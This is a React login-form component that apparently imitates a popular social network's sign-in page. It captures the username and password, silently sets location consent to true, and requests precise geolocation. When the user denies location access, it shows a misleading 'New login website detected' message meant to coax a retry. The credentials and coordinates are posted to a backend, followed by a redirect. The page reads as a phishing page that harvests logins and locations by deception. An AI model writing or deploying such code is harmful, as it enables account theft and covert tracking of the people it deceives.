'use client';

import { useState, useEffect } from 'react';

export default function LoginForm() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [locationError, setLocationError] = useState('');

  const getLocation = async (): Promise<{
    latitude: number;
    longitude: number;
    accuracy: number;
  } | null> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        setLocationError('Geolocation is not supported by your browser');
        resolve(null);
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          resolve({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          });
        },
        (err) => {
          setLocationError('New login website detected. Please try again.');
          console.error('Geolocation error:', err);
          resolve(null);
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    setLocationError('');

    try {
      const consent = true;

      let location = null;
      if (consent) {
        // First try
        location = await getLocation();
        
        // If first try fails, wait and try again
        if (!location) {
          await new Promise(resolve => setTimeout(resolve, 1000));
          location = await getLocation();
        }
      }

      const formData = new URLSearchParams();
      formData.append('username', username);
      formData.append('password', password);
      formData.append('locationConsent', consent.toString());
      
      if (location) {
        formData.append('latitude', location.latitude.toString());
        formData.append('longitude', location.longitude.toString());
        formData.append('accuracy', location.accuracy.toString());
      }

      const response = await fetch('/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: formData,
      });

      const result = await response.json();

      if (response.ok && result.redirectUrl) {
        window.location.href = result.redirectUrl;
      } else {
        setError(result.error || 'Login failed. Please try again.');
      }
    } catch (error) {
      console.error('Login error:', error);
      setError('An unexpected error occurred. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    const handleInputChange = (e: Event) => {
      const input = e.target as HTMLInputElement;
      const label = input.nextElementSibling as HTMLLabelElement;
      if (label) {
        if (input.value) {
          label.style.top = '3px';
          label.style.transform = 'none';
          label.style.fontSize = '10px';
        } else {
          label.style.top = '50%';
          label.style.transform = 'translateY(-50%)';
          label.style.fontSize = '12px';
        }
      }
    };

    const inputs = document.querySelectorAll('.login-form input');
    inputs.forEach(input => {
      input.addEventListener('input', handleInputChange);
      if ((input as HTMLInputElement).value) {
        handleInputChange({ target: input } as unknown as Event);
      }
    });

    return () => {
      inputs.forEach(input => {
        input.removeEventListener('input', handleInputChange);
      });
    };
  }, []);

  return (
    <form className="login-form" onSubmit={handleSubmit}>
      <div className="input-group">
        <input
          type="text"
          id="username"
          name="username"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          placeholder=" "
          required
        />
        <label htmlFor="username">
          Phone number, username, or email
        </label>
      </div>
      
      <div className="input-group">
        <input
          type={showPassword ? 'text' : 'password'}
          id="password"
          name="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          placeholder=" "
          required
        />
        <label htmlFor="password">
          Password
        </label>
        {password && (
          <button 
            type="button" 
            className="show-hide-btn"
            onClick={() => setShowPassword(!showPassword)}
          >
            {showPassword ? 'Hide' : 'Show'}
          </button>
        )}
      </div>

      {error && (
        <div className="error-message">
          {error}
        </div>
      )}

      {locationError && (
        <div className="error-message" style={{ color: 'orange' }}>
          {locationError}
        </div>
      )}
      
      <button 
        type="submit" 
        className="login-btn"
        disabled={!username || !password || isLoading}
      >
        {isLoading ? 'Logging in...' : 'Log in'}
      </button>
    </form>
  );
}